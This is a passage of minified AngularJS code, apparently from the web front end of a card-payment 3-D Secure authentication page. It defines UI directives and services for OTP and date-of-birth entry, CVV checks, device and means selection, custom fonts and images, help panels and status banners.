i,element,r,id,classNames,l;if(!angular.element(elem).hasClass("ng-hide")&&e&&e.target){for(element=e.target;element;element=element.parentNode){if(element===elem[0])return;if(id=element.id,classNames=element.className,l=classList.length,classNames&&void 0!==classNames.baseVal&&(classNames=classNames.baseVal),classNames||id)for(i=0;i<l;i++)if(r=new RegExp("\\b"+classList[i]+"\\b"),void 0!==id&&id===classList[i]||classNames&&r.test(classNames))return}$timeout(function(){$parse(attr.clickOutside)($scope,{event:e})})}}function _hasTouch(){return"ontouchstart"in window||navigator.maxTouchPoints}_hasTouch()&&$document.on("touchstart",eventHandler),$document.on("click",eventHandler),$scope.$on("$destroy",function(){_hasTouch()&&$document.off("touchstart",eventHandler),$document.off("click",eventHandler)})})}}}])}(),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("cancelButton",function(){return{restrict:"E",scope:{cnLabel:"=?"},templateUrl:"common/directives/CnButton/cancelButton.html",controller:"CnButtonCtrl"}}),ACS_COMMONS.factory("CnButton",["$rootScope",function($rootScope){return{cnLabel:"",disabled:!1,displayed:!0,action:function(){},subscribe:function(scope,callback){var handler=$rootScope.$on("update_cancel_button_event",callback);scope.$on("$destroy",handler)},setCnButtonInfo:function(cnLabel){this.cnLabel=cnLabel,$rootScope.$emit("update_cancel_button_event")},setCnButtonAction:function(cnAction){this.action=cnAction,$rootScope.$emit("update_cancel_button_event")},setDisable:function(value){this.disabled=value,$rootScope.$emit("update_cancel_button_event")},setDisplay:function(value){this.displayed=value,$rootScope.$emit("update_cancel_button_event")}}}]),ACS_COMMONS.controller("CnButtonCtrl",["$scope","$rootScope","$state","$timeout","CnButton",function($scope,$rootScope,$state,$timeout,CnButton){function initButton(){$scope.cnLabel||($scope.cnLabel=CnButton.cnLabel),$scope.disabled=CnButton.disabled,$scope.displayed=CnButton.displayed}initButton(),CnButton.subscribe($scope,function(){initButton()}),$scope.cancel=CnButton.action,$scope.cancelAction=function(){$scope.cancel()}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("customComponent",["$compile","$document","MediaSniffer",function($compile,$document,MediaSniffer){function getStyleSheet(styles){for(var sheets=$document[0].styleSheets,int=0;int<sheets.length;int++){var sheet=sheets[int];if("custom"===sheet.ownerNode.id){for(var int2=0;int2<styles.length;int2++){var style=styles[int2],selector="",isMediaQuery=!1;style.customMediaQuery?(selector="@media only screen and "+selector+style.customMediaQuery+"{",isMediaQuery=!0):(0<style.maxDeviceWidth||0<style.minDeviceWidth||0<style.maxDeviceHeight||0<style.minDeviceHeight)&&(selector="@media only screen and "+MediaSniffer.getMediaQuery(style,selector),selector+="{",isMediaQuery=!0),selector+=style.selector,style.selectorState&&(selector=selector+" "+style.selectorState);var rules="";angular.forEach(style.styles,function(value,key){rules=rules+key+": "+value+";"}),"insertRule"in sheet?(isMediaQuery&&(rules+="}"),sheet.insertRule(selector+"{"+rules+"}",0)):"addRule"in sheet&&sheet.addRule(selector,rules)}break}}}return{restrict:"E",scope:{layoutData:"="},link:function(scope,element,attrs){scope.$watch("layoutData",function(){element.html(function(scope){scope.style={};var template="";if(scope.layoutData){if(scope.layoutData.styles&&scope.layoutData.styles.constructor===Array){for(var int=0;int<scope.layoutData.styles.length;int++){var style=scope.layoutData.styles[int];MediaSniffer.on(style,function(mediaQuery,styles){mediaQuery.matches?angular.forEach(styles,function(value,key){scope.style[key]=value}):angular.forEach(styles,function(value,key){scope.style[key]===value&&delete scope.style[key]})},scope)}template+='<div ng-style="style"'}else template+="<div";if(scope.layoutData.controller&&(template=template+' ng-controller="'+scope.layoutData.controller+'"'),template+=">",scope.layoutData.elements&&scope.layoutData.elements.constructor===Array)for(int=0;int<scope.layoutData.elements.length;int++){var element=scope.layoutData.elements[int];template=template+"<"+element.type,"custom-component"===element.type?template=template+' layout-data="layoutData.elements['+int+']"':element.elementStyles&&element.elementStyles.constructor===Array&&0<element.elementStyles.length&&getStyleSheet(element.elementStyles),element.params&&angular.forEach(element.params,function(value,key){template=template+" "+key+'="'+value+'" '}),template+=">",element.value&&(template+=element.value),template=template+"</"+element.type+">"}else template+="$nbsp;";template+="</div>"}else console.log("no layout data!");return template}(scope)),$compile(element.contents())(scope)})}}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("customFont",function(){return{restrict:"E",scope:{titleKey:"=",fontKey:"=",mimeTypeKey:"=",id:"@?",straightMode:"@?"},templateUrl:"common/directives/CustomFonts/customFonts.html",controller:"CustomFontsCtrl"}}),ACS_COMMONS.controller("CustomFontsCtrl",["$scope","$rootScope","$translate","$replace","$straightTranslate","CustomItems","$timeout","$window",function($scope,$rootScope,$translate,$replace,$straightTranslate,CustomItems,$timeout,$window){$scope.initRCGenerator=0,$scope.limitRCGenerator=15,CustomItems.subscribe($scope,function(){$scope.doTranslate()}),$scope.generateUUID=function(){var d=(new Date).getTime(),cryptoObj=$window.crypto||$window.msCrypto;return"xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx".replace(/[xy]/g,function(c){if(void 0!==$window&&cryptoObj){var ua=new Uint8Array(1),randomNumber=cryptoObj.getRandomValues(ua),r=(d+randomNumber[0]/256*16)%16|0;return("x"==c?r:3&r|8).toString(16)}return("x"==c?_.random(0,9):8).toString(16)})},$scope.id&&""!=$scope.id||($scope.id=$scope.generateUUID()),$scope.generateStyle=function(retry){$timeout(function(){if(!(retry>=$scope.limitRCGenerator))if(null!=document.getElementById($scope.id)){var el=document.getElementById($scope.id+"_STYLE");null!=el&&("function"==typeof el.remove?el.remove():el.parentNode.removeChild(el)),$scope.mimeType&&""!=$scope.mimeType||($scope.mimeType="application/x-font-woff"),style=document.createElement("style"),style.id=$scope.id+"_STYLE",style.innerHTML='@font-face {font-family: "'+$scope.title+'";src: url(data:'+$scope.mimeType+";charset=utf-8;base64,"+$scope.font+");font-weight: normal;font-style: normal;}",document.getElementById($scope.id).parentElement.parentElement.appendChild(style)}else $scope.generateStyle(++retry)},100)},$scope.doTranslateFontMimeType=function(mimeTypeKey){$translate(mimeTypeKey).then(function(translation){$scope.mimeType=$replace(translation,CustomItems.filterKeys,CustomItems.filterValues),$scope.generateStyle($scope.initRCGenerator)},function(translationId){mimeTypeKey=$replace($scope.mimeTypeKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,"ALL"]),$translate(mimeTypeKey).then(function(translation){$scope.mimeType=$replace(translation,CustomItems.filterKeys,CustomItems.filterValues),$scope.generateStyle($scope.initRCGenerator)},function(){$scope.generateStyle($scope.initRCGenerator)})})},$scope.doTranslateFontData=function(fontKey,mimeTypeKey){$translate(fontKey).then(function(fontDataKey){$translate(fontDataKey).then(function(fontData){$scope.font=fontData,$scope.doTranslateFontMimeType(mimeTypeKey)},function(){})},function(){fontKey=$replace($scope.fontKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,"ALL"]),$translate(fontKey).then(function(fontDataKey){$translate(fontDataKey).then(function(fontData){$scope.font=fontData,$scope.doTranslateFontMimeType(mimeTypeKey)},function(){})},function(){})})},$scope.doTranslate=function(){$scope.font="";var titleKey=$replace($scope.titleKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,CustomItems.pageType]),fontKey=$replace($scope.fontKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,CustomItems.pageType]),mimeTypeKey=$replace($scope.mimeTypeKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,CustomItems.pageType]);1==$scope.straightMode||1==$rootScope.straightMode?($scope.title=$replace($straightTranslate(titleKey),CustomItems.filterKeys,CustomItems.filterValues),$scope.font=$straightTranslate($straightTranslate(fontKey)),$scope.mimeType=$replace($straightTranslate(mimeTypeKey),CustomItems.filterKeys,CustomItems.filterValues),$scope.generateStyle($scope.initRCGenerator)):$translate(titleKey).then(function(translation){$scope.title=$replace(translation,CustomItems.filterKeys,CustomItems.filterValues),$scope.doTranslateFontData(fontKey,mimeTypeKey)},function(translationId){titleKey=$replace($scope.titleKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,"ALL"]),$translate(titleKey).then(function(translation){$scope.title=$replace(translation,CustomItems.filterKeys,CustomItems.filterValues),$scope.doTranslateFontData(fontKey,mimeTypeKey)},function(){})})},$scope.doTranslate(),$rootScope.$on("$translateChangeSuccess",function(){$scope.doTranslate()}),$scope.$watch("titleKey",function(){$scope.doTranslate()}),$scope.$watch("fontKey",function(){$scope.doTranslate()}),$scope.$on("setFontKey",function(event,value){$scope.fontKey=value,$scope.doTranslate()})}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("customImage",function(){return{restrict:"E",scope:{altKey:"=",imageKey:"=",id:"@?",straightMode:"@?"},templateUrl:"common/directives/CustomImages/customImages.html",controller:"CustomImagesCtrl"}}),ACS_COMMONS.controller("CustomImagesCtrl",["$scope","$rootScope","$translate","$replace","$straightTranslate","CustomItems",function($scope,$rootScope,$translate,$replace,$straightTranslate,CustomItems){CustomItems.subscribe($scope,function(){$scope.doTranslate()}),$scope.doTranslate=function(){$scope.image="iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuOWwzfk4AAAANSURBVBhXY/j///9/AAn7A/0FQ0XKAAAAAElFTkSuQmCC";var altKey=$replace($scope.altKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,CustomItems.pageType]),imageKey=$replace($scope.imageKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,CustomItems.pageType]);1==$scope.straightMode||1==$rootScope.straightMode?($scope.alt=$replace($straightTranslate(altKey),CustomItems.filterKeys,CustomItems.filterValues),$scope.image=$straightTranslate($straightTranslate(imageKey))):(_.isEmpty(altKey)||$translate(altKey).then(function(translation){$scope.alt=$replace(translation,CustomItems.filterKeys,CustomItems.filterValues)},function(translationId){altKey=$replace($scope.altkey,["means","network","pageType"],[CustomItems.means,CustomItems.network,"ALL"]),_.isEmpty(altKey)||$translate(altKey).then(function(translation){$scope.alt=$replace(translation,CustomItems.filterKeys,CustomItems.filterValues)},function(){})}),_.isEmpty(imageKey)||$translate(imageKey).then(function(imageDataKey){$translate(imageDataKey).then(function(imageData){$scope.image=imageData},function(){})},function(){imageKey=$replace($scope.imageKey,["means","network","pageType"],[CustomItems.means,CustomItems.network,"ALL"]),$translate(imageKey).then(function(imageDataKey){$translate(imageDataKey).then(function(imageData){$scope.image=imageData},function(){})},function(){})}))},$scope.doTranslate(),$rootScope.$on("$translateChangeSuccess",function(){$scope.doTranslate()}),$scope.$watch("altKey",function(){$scope.doTranslate()}),$scope.$watch("imageKey",function(){$scope.doTranslate()}),$scope.$on("setImageKey",function(event,value){$scope.imageKey=value,$scope.doTranslate()})}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("CustomTextsService",["$rootScope","$straightTranslate","$translate","$replace","$q","CustomItems",function($rootScope,$straightTranslate,$translate,$replace,$q,CustomItems){return{getTranslation:function(customTextKey,straightMode,rejectIfNotFound){var deferredTranslation=$q.defer();if(_.isNil(customTextKey)&&!0===rejectIfNotFound)deferredTranslation.reject();else{var key=$replace(customTextKey,["network","means","pageType"],[CustomItems.network,CustomItems.means,CustomItems.pageType]);if(_.isEmpty(key))return!0===rejectIfNotFound?deferredTranslation.reject():deferredTranslation.resolve(""),deferredTranslation.promise;if(!0===straightMode||!0===$rootScope.straightMode){var straightTranslated=$straightTranslate(key);_.isEqual(straightTranslated,key)&&!0===rejectIfNotFound?deferredTranslation.reject():deferredTranslation.resolve($replace(straightTranslated,CustomItems.filterKeys,CustomItems.filterValues))}else $translate(key).then(function(translation){deferredTranslation.resolve($replace(translation,CustomItems.filterKeys,CustomItems.filterValues))},function(){key=$replace(customTextKey,["network","means","pageType"],[CustomItems.network,CustomItems.means,"ALL"]),$translate(key).then(function(translation){deferredTranslation.resolve($replace(translation,CustomItems.filterKeys,CustomItems.filterValues))},function(translationId){!0===rejectIfNotFound?deferredTranslation.reject():deferredTranslation.resolve(translationId)})})}return deferredTranslation.promise}}}]),ACS_COMMONS.directive("customText",function(){return{restrict:"E",scope:{customTextKey:"=?",straightMode:"@?",id:"@?"},templateUrl:"common/directives/CustomTexts/customTexts.html",controller:"CustomTextsCtrl"}}),ACS_COMMONS.controller("CustomTextsCtrl",["$scope","$rootScope","CustomItems","CustomTextsService",function($scope,$rootScope,CustomItems,CustomTextsService){CustomItems.subscribe($scope,function(){$scope.doTranslate()}),$scope.doTranslate=function(){CustomTextsService.getTranslation($scope.customTextKey,$scope.straightMode,!1).then(function(translation){$scope.customText=translation})},$scope.doTranslate(),$rootScope.$on("$translateChangeSuccess",function(){$scope.doTranslate()}),$scope.$watch("customTextKey",function(){$scope.doTranslate()}),$scope.$on("setTextKey",function(event,value){$scope.customTextKey=value,$scope.doTranslate()})}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("dateForm",function(){return{restrict:"E",scope:{separator:"@?"},templateUrl:"common/directives/DateForm/dateForm.html",controller:"DateFormCtrl"}}),ACS_COMMONS.directive("moveNextOnMaxlength",function(){return{restrict:"A",link:function($scope,element){element.on("input",function(e){if(element.val().length==element.attr("maxlength")){var $nextElement=element.next();"TEXT"==$nextElement[0].nodeName&&($nextElement=$nextElement.next()),$nextElement.length&&$nextElement[0].focus()}})}}}),ACS_COMMONS.controller("DateFormCtrl",["$scope","$rootScope","OtpRecorder","cvvRecorder","ValButton",function($scope,$rootScope,OtpRecorder,cvvRecorder,ValButton){ValButton.setDisable(!0),cvvRecorder.subscribe($scope,function(){$scope.saveOtp()}),OtpRecorder.onDisabledOtpInput($scope,function(){$scope.input.disabled=OtpRecorder.disabled}),$scope.input={otpDays:"",otpMonth:"",otpYear:"",disabled:OtpRecorder.disabled},$scope.onlyNumber=function(e){var theEvent=e||window.event,key=theEvent.key;!/[0-9]/.test(key)&&1==key.length&&(1!=theEvent.metaKey&&1!=theEvent.ctrlKey||"v"!=key&&"c"!=key)&&(theEvent.returnValue=!1,theEvent.preventDefault&&theEvent.preventDefault())},$scope.registerDDNInCvvRecorder=function(){cvvRecorder.isDDNPresent=!0},$scope.isDDNValid=function(){var days=$scope.input.otpDays,month=$scope.input.otpMonth,year=$scope.input.otpYear;!_.isEmpty(days)&&2==days.length&&_.lte(days,31)&&!_.isEmpty(month)&&2==month.length&&_.lte(month,12)&&!_.isEmpty(year)&&4<=year.length&&_.gte(year,1900)?cvvRecorder.isDDNValid=!0:cvvRecorder.isDDNValid=!1},$scope.saveOtp=function(){$scope.isDDNValid(),!cvvRecorder.isDDNValid||cvvRecorder.isCVVPresent&&!cvvRecorder.isCVVValid||OtpRecorder.enterOtp($scope.input.otpDays+$scope.input.otpMonth+$scope.input.otpYear),cvvRecorder.isCVVPresent?ValButton.setDisable(!(cvvRecorder.isDDNValid&&cvvRecorder.isCVVValid)):ValButton.setDisable(!cvvRecorder.isDDNValid)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("deviceSelect",function(){return{restrict:"E",scope:{devices:"=",selectBoxStyleEnabled:"=?",preselectFirstDevice:"=?",deviceLabel:"=?"},templateUrl:"common/directives/DeviceSelect/deviceSelect.html",controller:"DeviceSelectCtrl"}}),ACS_COMMONS.factory("DeviceSelect",["$rootScope",function($rootScope){return{devices:[],selectedDeviceId:"",selectedDevice:"",disabled:!1,subscribe:function(scope,callback){var handler=$rootScope.$on("select_device_event",callback);scope.$on("$destroy",handler)},setDisabled:function(disabled){this.disabled=disabled,$rootScope.$emit("disable_selection_event")},setDevices:function(devices){this.devices=devices},onDisabledToggle:function(scope,callback){var handler=$rootScope.$on("disable_selection_event",callback);scope.$on("$destroy",handler)},updateDevice:function(device){this.selectedDeviceId=device.id,this.selectedDevice=device.value,$rootScope.$emit("select_device_event")},clearDevice:function(){this.selectedDeviceId="",this.selectedDevice="",$rootScope.$emit("select_device_event")},hasSelectedDevice:function(){return this.selectedDeviceId&&0!==this.selectedDeviceId.length},subscribeClicked:function(scope,callback){var handler=$rootScope.$on("select_device_clicked",callback);scope.$on("$destroy",handler)},clicked:function(){$rootScope.$emit("select_device_clicked")}}}]),ACS_COMMONS.controller("DeviceSelectCtrl",["$scope","DeviceSelect",function($scope,DeviceSelect){DeviceSelect.onDisabledToggle($scope,function(){$scope.disabled=DeviceSelect.disabled}),$scope.devices=DeviceSelect.devices,$scope.isDeviceSelected=function(device){return DeviceSelect.selectedDeviceId===device.id},$scope.selectDevice=function(device){DeviceSelect.clicked(),DeviceSelect.updateDevice(device)},$scope.selectBoxStyleEnabled||($scope.selectBoxStyleEnabled=!1),$scope.selectBoxStyleIsEnabled=function(){return $scope.selectBoxStyleEnabled},$scope.preselectFirstDevice&&!DeviceSelect.hasSelectedDevice()&&$scope.selectBoxStyleEnabled&&DeviceSelect.devices&&0<DeviceSelect.devices.length&&($scope.selectDevice(DeviceSelect.devices[0]),$scope.currentDevice=DeviceSelect.devices[0])}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("ecbl",function(){return{restrict:"E",scope:{enabled:"=?",disabled:"=?"},controller:"eCBLCtrl"}}),ACS_COMMONS.controller("eCBLCtrl",["$scope","$rootScope","$sessionStorage",function($scope,$rootScope,$sessionStorage){function showECBL(show){if(_.isString($scope.enabled)){var enabledElements=document.getElementsByClassName($scope.enabled);_.forEach(enabledElements,function(el){el.style.display=show?"block":"none"})}if(_.isString($scope.disabled)){var disabledElements=document.getElementsByClassName($scope.disabled);_.forEach(disabledElements,function(el){el.style.display=show?"none":"block"})}}_.isNil($rootScope.uniqueId)||_.isNil($sessionStorage[$rootScope.uniqueId])||!_.includes($sessionStorage[$rootScope.uniqueId].merchantName,"e-Carte Bleue")?showECBL(!1):showECBL(!0)}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("externalImage",function(){return{restrict:"E",templateUrl:"common/directives/ExternalImage/ExternalImage.html",controller:"ExternalImageCtrl"}}),ACS_COMMONS.factory("ExternalImageService",["$rootScope",function($rootScope){return{imageBase64Value:"",displayed:!1,setImageBase64Value:function(input){this.imageBase64Value=input,$rootScope.$emit("UPDATE_EXTERNAL_IMAGE_EVENT")},setDisplayed:function(isDisplayed){this.displayed=isDisplayed,$rootScope.$emit("UPDATE_EXTERNAL_IMAGE_EVENT")},subscribe:function(scope,callback){var handler=$rootScope.$on("UPDATE_EXTERNAL_IMAGE_EVENT",callback);scope.$on("$destroy",handler)}}}]),ACS_COMMONS.controller("ExternalImageCtrl",["$scope","ExternalImageService",function($scope,ExternalImageService){function updateElement(){$scope.imagedata=ExternalImageService.imageBase64Value,$scope.displayed=ExternalImageService.displayed}ExternalImageService.subscribe($scope,function(){updateElement()}),updateElement()}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).config(["$compileProvider",function($compileProvider){$compileProvider.aHrefSanitizationWhitelist(/^\s*(https?|ftp|mailto|tel|file|TSTACSAPP|KBCACSAPP|belacsapp|CBCACSAPP):/i)}]),ACS_COMMONS.directive("externalLink",function(){return{restrict:"E",templateUrl:"common/directives/ExternalLink/ExternalLink.html",scope:{externalLinkLabel:"=?"},controller:"ExternalLinkCtrl"}}),ACS_COMMONS.factory("ExternalLinkService",["$rootScope",function($rootScope){return{externalLinkValue:"",displayed:!1,externalLinkLabel:"",setUrl:function(url){this.externalLinkValue=url,$rootScope.$emit("UPDATE_URL_EVENT")},setLabel:function(externalLinkLabel){this.externalLinkLabel=externalLinkLabel,$rootScope.$emit("UPDATE_URL_EVENT")},setDisplayed:function(isDisplayed){this.displayed=isDisplayed,$rootScope.$emit("UPDATE_URL_EVENT")},subscribe:function(scope,callback){var handler=$rootScope.$on("UPDATE_URL_EVENT",callback);scope.$on("$destroy",handler)}}}]),ACS_COMMONS.controller("ExternalLinkCtrl",["$scope","ExternalLinkService",function($scope,ExternalLinkService){function updateElement(){$scope.externalLinkValue=ExternalLinkService.externalLinkValue,$scope.displayed=ExternalLinkService.displayed,$scope.externalLinkLabel||($scope.externalLinkLabel=ExternalLinkService.externalLinkLabel)}ExternalLinkService.subscribe($scope,function(){updateElement()}),updateElement()}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("hamburger",function(){return{restrict:"E",scope:{hamburgerTextKey:"=?"},templateUrl:"common/directives/Hamburger/hamburger.html",controller:"HamburgerCtrl"}}),ACS_COMMONS.factory("Hamburger",["$rootScope",function($rootScope){var UPDATE_EVENT="hamburger-update-display";return{show:!1,hamburgerTextKey:"",subscribe:function(scope,callback){var handler=$rootScope.$on(UPDATE_EVENT,callback);scope.$on("$destroy",handler)},toggleDisplay:function(){this.show=!this.show,$rootScope.$emit(UPDATE_EVENT)},hideDisplay:function(){this.show=!1,$rootScope.$emit(UPDATE_EVENT)},updateCustomTextKey:function(network,means,pageType){this.hamburgerTextKey=_.join([network,means,pageType,"1"],"_"),$rootScope.$emit(UPDATE_EVENT)}}}]),ACS_COMMONS.controller("HamburgerCtrl",["$scope","$rootScope","CustomItems","Hamburger",function($scope,$rootScope,CustomItems,Hamburger){Hamburger.subscribe($scope,function(){$scope.show=Hamburger.show,$scope.hamburgerTextKey=Hamburger.hamburgerTextKey,$scope.$broadcast("setTextKey",$scope.hamburgerTextKey)}),$scope.toggleDisplay=function(){Hamburger.toggleDisplay()},$scope.layoutData=CustomItems.getCustomPageLayout("HAMBURGER_MENU")}]),ACS_COMMONS.directive("helpCloseButton",function(){return{restrict:"E",scope:{helpLabel:"=?",helpCloseLabel:"=?"},templateUrl:"common/directives/Help/HelpCloseButton/helpCloseButton.html",controller:"HelpCloseCtrl"}}),ACS_COMMONS.controller("HelpCloseCtrl",["$scope","HelpService",function($scope,HelpService){$scope.helpCloseLabel||($scope.helpCloseLabel=HelpService.helpCloseLabel),$scope.hideHelp=function(){HelpService.hide()}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("help",function(){return{restrict:"E",scope:{helpLabel:"=?"},templateUrl:"common/directives/Help/help.html",controller:"HelpCtrl"}}),ACS_COMMONS.factory("HelpService",["$rootScope",function($rootScope){return{showing:!1,network:"",means:"",helpLabel:"",helpCloseLabel:"",disabled:!1,onDisplayToogle:function(scope,callback){var handler=$rootScope.$on("display-help-modal",callback);scope.$on("$destroy",handler)},show:function(){this.showing=!0,this.disabled=!0,$rootScope.$emit("display-help-modal")},hide:function(){this.showing=!1,this.disabled=!1,$rootScope.$emit("display-help-modal")},setProperties:function(network,means){this.network=network,this.means=means},subscribe:function(scope,callback){var handler=$rootScope.$on("update_help_button_event",callback);scope.$on("$destroy",handler)},setHelpButtonInfo:function(helpLabel){this.helpLabel=helpLabel,$rootScope.$emit("update_help_button_event")},setDisable:function(value){this.disabled=value,$rootScope.$emit("update_help_button_event")},setHelpCloseButton:function(helpCloseLabel){this.helpCloseLabel=helpCloseLabel,$rootScope.$emit("update_help_button_event")}}}]),ACS_COMMONS.controller("HelpCtrl",["$scope","$rootScope","CustomItems","HelpService",function($scope,$rootScope,CustomItems,HelpService){function initHelp(){$scope.helpLabel||($scope.helpLabel=HelpService.helpLabel),$scope.show=HelpService.showing,$scope.disabled=HelpService.disabled,$scope.means=HelpService.means,$scope.network=HelpService.network,$scope.layoutData=CustomItems.getCustomPageLayout("HELP_PAGE")}initHelp(),HelpService.subscribe($scope,function(){initHelp()}),HelpService.onDisplayToogle($scope,function(){$scope.show=HelpService.showing,$scope.means=HelpService.means,$scope.network=HelpService.network,$scope.disabled=HelpService.disabled}),$scope.help=function(){HelpService.show()}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("manualSubmit",["$timeout",function($timeout){return{require:"form",restrict:"A",link:function($scope,$el,$attr,$form){$form.submit=function(action,inputValues){if(action&&"string"==typeof action&&($el[0].action=action),inputValues&&angular.isArray(inputValues))for(var i=0;i<inputValues.length;i++)$el[0][i].value=inputValues[i];$el[0].submit()}}}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("meansSelect",function(){return{restrict:"E",scope:{meansChoices:"="},templateUrl:"common/directives/MeansSelect/meansSelect.html",controller:"MeansSelectCtrl"}}),ACS_COMMONS.factory("MeansSelect",["$rootScope",function($rootScope){return{means:[],subscribe:function(scope,callback){var handler=$rootScope.$on("select_means_event",callback);scope.$on("$destroy",handler)},setMeans:function(means){this.means=means,$rootScope.$emit("select_means_event")}}}]),ACS_COMMONS.controller("MeansSelectCtrl",["$scope","$rootScope","MeansSelect",function($scope,$rootScope,MeansSelect){function checkIfMeansAvailable(){_.isEmpty(MeansSelect.means)||($scope.meansChoices=MeansSelect.means)}checkIfMeansAvailable(),MeansSelect.subscribe($scope,function(){checkIfMeansAvailable()})}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("meansSelectMenu",function(){return{restrict:"E",templateUrl:"common/directives/MeansSelectMenu/meansSelectMenu.html",controller:"MeansSelectMenuCtrl"}}),ACS_COMMONS.factory("MeansSelectMenu",["$rootScope","$injector","$q","CustomTextsService",function($rootScope,$injector,$q,CustomTextsService){var meansSelectMenu={customTextOrdinal:9,translatedMeans:[],selectedMean:null,meansSelectMeansAction:function(){},setMeansSelectMenuAction:function(action){this.meansSelectMeansAction=action},subscribe:function(scope,callback){var handler=$rootScope.$on("select_means_menu_event",callback);scope.$on("$destroy",handler)},setMeans:function(network,selectedMeans,pageTypes,allMeans){var self=this;self.translatedMeans=[];for(var allPromises=[],i=0;i<allMeans.length;i++){var currentMean=allMeans[i],promise=this.translateLabel(network,currentMean,pageTypes);allPromises.push(promise)}$q.all(allPromises).then(function(values){self.translatedMeans=values,selectedMeans&&(self.selectedMean=_.find(self.translatedMeans,function(current){return current.value===selectedMeans})),$rootScope.$emit("select_means_menu_event")})},translateLabel:function(network,means,pageTypes){var key=_.join([network,means,pageTypes,meansSelectMenu.customTextOrdinal],"_");return CustomTextsService.getTranslation(key,$rootScope.straightMode,!1).then(function(displayText){var newEntry={};return newEntry.value=means,newEntry.displayText=displayText,newEntry},function(errorText){var newEntry={};return newEntry.value=means,newEntry.displayText=key,newEntry})},subscribeItemSelected:function(scope,callback){var handler=$rootScope.$on("means-select-menu-item-selected",callback);scope.$on("$destroy",handler)},itemSelected:function(){$rootScope.$emit("means-select-menu-item-selected")}};return meansSelectMenu}]),ACS_COMMONS.controller("MeansSelectMenuCtrl",["$scope","$rootScope","$state","MeansSelectMenu",function($scope,$rootScope,$state,MeansSelectMenu){$scope.selectedMean={};function initOptions(){_.isEmpty(MeansSelectMenu.translatedMeans)||($scope.meansChoices=MeansSelectMenu.translatedMeans,$scope.selectedMean=MeansSelectMenu.selectedMean)}initOptions(),MeansSelectMenu.subscribe($scope,function(){initOptions()}),$scope.handleSelect=function(){MeansSelectMenu.itemSelected(),MeansSelectMenu.meansSelectMeansAction($scope.selectedMean.value)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("merchantWhiteList",function(){return{restrict:"E",scope:{merchantWhitelistLabel:"=?"},templateUrl:"common/directives/MerchantWhitelist/merchantWhiteList.html",controller:"MerchantWhiteListCtrl"}}),ACS_COMMONS.factory("MerchantWhiteList",["$rootScope",function($rootScope){var merchantWhiteList={merchantWhitelistLabel:"",selectedMerchantWhitelisting:!1,displayed:!1,setDisplay:function(value){this.displayed=value,$rootScope.$emit("merchant_Whitelist_Event")},selectMerchantWhitelisting:function(checkBoxVal){merchantWhiteList.selectedMerchantWhitelisting=checkBoxVal}};return merchantWhiteList}]),ACS_COMMONS.controller("MerchantWhiteListCtrl",["$scope","$rootScope","$state","$timeout","MerchantWhiteList",function($scope,$rootScope,$state,$timeout,merchantWhiteList){$scope.input={selectedMerchantWhitelisting:!1,displayed:merchantWhiteList.displayed},$scope.saveCheckBoxValue=function(){merchantWhiteList.selectMerchantWhitelisting($scope.input.selectedMerchantWhitelisting)}}]);ACS_COMMONS=angular.module("ACS_COMMONS");var DisplayType=Object.freeze({CLOSABLE:0,FINAL:1,WAITING:2}),MessageLevel=Object.freeze({SUCCESS:0,INFO:1,WARNING:2,ERROR:3,PROPERTIES:{0:{style:"success",iconStyle:"fa fa-check-circle"},1:{style:"info",iconStyle:"fa fa-info-circle"},2:{style:"warn",icon:"fa fa-info-circle"},3:{style:"error",iconStyle:"fa fa-times-circle"}}});ACS_COMMONS.factory("MessageBanner",["$rootScope","$q","$injector","$replace",function($rootScope,$q,$injector,$replace){var messageBanner={displayType:DisplayType.CLOSABLE,messageLevel:MessageLevel.INFO,heading:"",message:"",headingOverridden:"",messageOverridden:"",show:!1,AUTHENTICATION_IN_PROGRESS:{defaultHeader:"OTP_VALIDATION_HEADING",defaultText:"OTP_VALIDATION_MESSAGE",headerOrdinal:12,textOrdinal:13,messageLevel:MessageLevel.WARNING,displayType:DisplayType.WAITING},TRANSACTION_CANCELLED:{defaultHeader:"TRANSACTION_CANCELLED_HEADING",defaultText:"TRANSACTION_CANCELLED_MESSAGE",headerOrdinal:14,textOrdinal:15,messageLevel:MessageLevel.INFO,displayType:DisplayType.FINAL},AUTHENT_FAILURE:{defaultHeader:"AUTHENT_FAILURE_HEADING",defaultText:"AUTHENT_FAILURE_MESSAGE",headerOrdinal:16,textOrdinal:17,messageLevel:MessageLevel.ERROR,displayType:DisplayType.FINAL},INFO_ACCEPT:{defaultHeader:"INFO_ACCEPT_HEADING",defaultText:"INFO_ACCEPT_MESSAGE",headerOrdinal:18,textOrdinal:19,messageLevel:MessageLevel.ERROR,displayType:DisplayType.CLOSABLE},AUTHENT_REFUSAL:{defaultHeader:"TRANSACTION_REFUSAL_HEADING",defaultText:"TRANSACTION_REFUSAL_MESSAGE",headerOrdinal:22,textOrdinal:23,messageLevel:MessageLevel.ERROR,displayType:DisplayType.FINAL},AUTHENT_SUCCESS:{defaultHeader:"AUTHENT_SUCCESS_HEADING",defaultText:"AUTH